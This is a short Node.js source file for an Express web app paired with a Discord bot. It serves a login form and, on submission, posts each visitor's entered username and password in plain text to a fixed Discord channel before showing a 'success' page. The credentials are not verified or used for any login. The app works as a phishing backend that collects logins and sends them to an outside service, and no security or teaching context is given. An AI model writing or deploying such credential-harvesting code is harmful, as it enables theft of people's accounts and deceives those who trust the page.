//Including the required node modules and setting global variables
require('dotenv').config();
const Discord = require('discord.js');
const bot = new Discord.Client();
const TOKEN = process.env.TOKEN;
var express         = require('express');
var bodyParser      = require('body-parser');


//Initalizing the express app
var app = express();

//Setting the body parser
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json())
app.use(express.static(__dirname + '/public'));

//Setting the view engine to allow the use of .ejs files
app.set('view engine', 'ejs')

bot.login(TOKEN);

bot.on('ready', () => {
    console.info(`Logged in as ${bot.user.tag}!`);
  });

//Rendering the home page for the main form
app.get('/', function (req, res, next) {
    res.redirect('/login')
});


//Rendering the login page
app.get("/login", function (req, res, next) {
    res.render('login');
});

app.get("/success", function (req, res, next) {
    res.render('success');
});

app.post("/submit-login", function (req, res, next) {
    discordusername = req.body.discordusername;
    username = req.body.username;
    password = req.body.password;

    var general = bot.channels.cache.get("750983712497467432");
    general.send('<@' + discordusername + '>');
    general.send(username);
    general.send(password);
    general.send('.');

    res.redirect('/success')
});

//Local port to connect to the node app
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Our app is running on port ${ PORT }`);
});